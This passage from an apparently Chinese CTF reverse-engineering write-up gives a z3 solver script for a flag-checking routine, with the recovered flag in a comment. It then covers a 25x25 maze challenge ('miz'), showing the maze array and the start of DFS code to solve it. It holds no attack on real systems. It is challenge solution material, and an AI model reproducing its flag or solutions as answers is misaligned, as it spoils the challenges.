class="line">tmp1[<span class="number">8</span>] = (flag[<span class="number">7</span>] + <span class="number">45</span>) ^ flag[<span class="number">8</span>]</span><br><span class="line">tmp1[<span class="number">9</span>] = (flag[<span class="number">9</span>] &amp; <span class="number">0x37</span>) - <span class="number">3</span></span><br><span class="line">tmp1[<span class="number">11</span>] = flag[<span class="number">11</span>] - <span class="number">38</span></span><br><span class="line">tmp1[<span class="number">12</span>] = <span class="number">4</span> * ((flag[<span class="number">12</span>] ^ flag[<span class="number">6</span>]) + <span class="number">4</span>)</span><br><span class="line">tmp1[<span class="number">5</span>] = (flag[<span class="number">21</span>] - flag[<span class="number">4</span>]) ^ <span class="number">0x30</span></span><br><span class="line">tmp1[<span class="number">13</span>] = flag[<span class="number">13</span>] - flag[<span class="number">14</span>] - <span class="number">1</span></span><br><span class="line">tmp1[<span class="number">10</span>] = flag[<span class="number">17</span>] - flag[<span class="number">16</span>] + <span class="number">82</span></span><br><span class="line">tmp1[<span class="number">16</span>] = <span class="number">6</span> * (flag[<span class="number">18</span>] ^ flag[<span class="number">19</span>]) + <span class="number">54</span></span><br><span class="line">tmp1[<span class="number">17</span>] = flag[<span class="number">21</span>] + <span class="number">49</span> + (flag[<span class="number">20</span>] ^ <span class="number">0x73</span>)</span><br><span class="line">tmp1[<span class="number">14</span>] = flag[<span class="number">22</span>]</span><br><span class="line">tmp1[<span class="number">18</span>] = flag[<span class="number">23</span>] ^ <span class="number">0x42</span></span><br><span class="line">tmp1[<span class="number">15</span>] = flag[<span class="number">26</span>] + <span class="number">5</span></span><br><span class="line">tmp1[<span class="number">19</span>] = flag[<span class="number">25</span>] - flag[<span class="number">26</span>] / <span class="number">2</span> - <span class="number">55</span></span><br><span class="line">tmp1[<span class="number">20</span>] = <span class="number">4</span> * flag[<span class="number">27</span>] - (flag[<span class="number">28</span>] + <span class="number">128</span>)</span><br><span class="line">tmp1[<span class="number">21</span>] = flag[<span class="number">29</span>] - <span class="number">32</span></span><br><span class="line"></span><br><span class="line">tmp2[<span class="number">0</span>] = (tmp1[<span class="number">0</span>] ^ <span class="number">2</span>) - <span class="number">31</span></span><br><span class="line">tmp2[<span class="number">1</span>] = ((tmp1[<span class="number">1</span>] % <span class="number">2</span>) ^ tmp1[<span class="number">0</span>]) - <span class="number">29</span></span><br><span class="line">tmp2[<span class="number">2</span>] = (<span class="number">4</span> * tmp1[<span class="number">1</span>]) ^ <span class="number">0x97</span></span><br><span class="line">tmp2[<span class="number">3</span>] = tmp1[<span class="number">2</span>] ^ <span class="number">0xA0</span></span><br><span class="line">tmp2[<span class="number">4</span>] = (tmp1[<span class="number">3</span>] ^ <span class="number">0x4D</span>) + <span class="number">7</span></span><br><span class="line">tmp2[<span class="number">5</span>] = <span class="number">4</span> * tmp1[<span class="number">5</span>] - <span class="number">1</span></span><br><span class="line">tmp2[<span class="number">3</span>] = tmp1[<span class="number">4</span>] + <span class="number">116</span></span><br><span class="line">tmp2[<span class="number">6</span>] = tmp1[<span class="number">6</span>] + <span class="number">21</span></span><br><span class="line">tmp2[<span class="number">7</span>] = tmp1[<span class="number">7</span>] - <span class="number">20</span></span><br><span class="line">tmp2[<span class="number">8</span>] = tmp1[<span class="number">8</span>] ^ <span class="number">0x63</span></span><br><span class="line">tmp2[<span class="number">9</span>] = (tmp1[<span class="number">10</span>] ^ <span class="number">3</span>) - tmp1[<span class="number">8</span>] + <span class="number">54</span></span><br><span class="line">tmp2[<span class="number">10</span>] = tmp1[<span class="number">9</span>] ^ <span class="number">0x42</span></span><br><span class="line">tmp2[<span class="number">11</span>] = tmp1[<span class="number">11</span>] + <span class="number">51</span></span><br><span class="line">tmp2[<span class="number">11</span>] = tmp1[<span class="number">12</span>] ^ <span class="number">0xB3</span></span><br><span class="line">tmp2[<span class="number">12</span>] = (tmp1[<span class="number">13</span>] + <span class="number">18</span>) ^ <span class="number">0x1A</span></span><br><span class="line">tmp2[<span class="number">13</span>] = tmp1[<span class="number">14</span>] - <span class="number">7</span></span><br><span class="line">tmp2[<span class="number">14</span>] = tmp1[<span class="number">15</span>] - <span class="number">37</span></span><br><span class="line">tmp2[<span class="number">15</span>] = tmp1[<span class="number">17</span>] ^ <span class="number">0xE5</span></span><br><span class="line">tmp2[<span class="number">16</span>] = (tmp1[<span class="number">18</span>] &amp; <span class="number">0x36</span>) + <span class="number">53</span></span><br><span class="line">tmp2[<span class="number">14</span>] = tmp1[<span class="number">19</span>] ^ <span class="number">0x34</span></span><br><span class="line">tmp2[<span class="number">17</span>] = tmp1[<span class="number">20</span>] ^ <span class="number">0xFD</span></span><br><span class="line">tmp2[<span class="number">18</span>] = (tmp1[<span class="number">20</span>] &gt;&gt; tmp1[<span class="number">21</span>]) ^ <span class="number">0x1C</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    s.add(flag[i]&gt;=<span class="number">0x21</span>)</span><br><span class="line">    s.add(flag[i]&lt;=<span class="number">0x7A</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    s.add(tmp2[i]&amp;<span class="number">0xff</span>==<span class="built_in">ord</span>(code[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">     model = s.model()</span><br><span class="line">     <span class="built_in">str</span> = [<span class="built_in">chr</span>(model[flag[i]].as_long().real) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line">     print(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>))</span><br><span class="line">     exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&quot;no_sat&quot;</span>)</span><br><span class="line"><span class="comment">#hTMT0_C0m3@@_m90`z00R_t20ZFbF!</span></span><br></pre></td></tr></table></figure><h2 id="miz"><a href="#miz" class="headerlink" title="miz"></a>miz</h2><p>迷宫题，还挺大，25*25，好像还有花，弄得能反编译后去找迷宫，和走迷宫的方式就行了。</p><p>迷宫函数，可以用动调来提数据<br><img src="https://i.loli.net/2021/08/16/opsU8SZmJzFIYhR.png"><br>可以看到是128bit，但是后面一个数就会变成2个64bit，意思就是这个函数中的一个，就是迷宫中的两个。</p><p>走迷宫函数<br><img src="https://i.loli.net/2021/08/16/wghIbkpeY1dVQiy.png"></p><p>dfs走迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//打印迷宫 </span></span><br><span class="line"><span class="comment">//#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">//int main()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//int map[25][25]=&#123;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,1,1,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,0,1,0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,1,1,0,1,1,1,1,1,1,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,1,0,1,1,1,1,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,1,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,0,1,0,1,0,1,1,1,1,1,1,1,0,1,1,1,0,1,0,1,1,1,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,0,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,1,0,0,0,1,0,0,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,1,0,1,1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,1,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,1,0,1,0,1,0,1,1,1,1,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1,1,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,1,0,1,1,0,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,1,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,1,0,1,0,1,1,1,1,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,1,1,1,1,1&#125;;</span></span><br><span class="line"><span class="comment">// int i ,j;</span></span><br><span class="line"><span class="comment">// for(i=0; i&lt;25;i++)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;&#123;&quot;);</span></span><br><span class="line"><span class="comment">// for(j=0;j&lt;25;j++)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;%-2d,&quot;,map[i][j]);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// printf(&quot;&#125;,\n&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">25</span>][<span class="number">25</span>] = &#123;&#123;<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">1</span> &#125;,</span><br><span class="line">&#123;<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">1</span> ,&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mark[<span class="number">25</span>][<span class="number">25</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> way[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>[x][y] == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;way: %s\n&quot;</span>, way);</span><br><span class="line"><span class="comment">//exit(0);</span></span><br><span 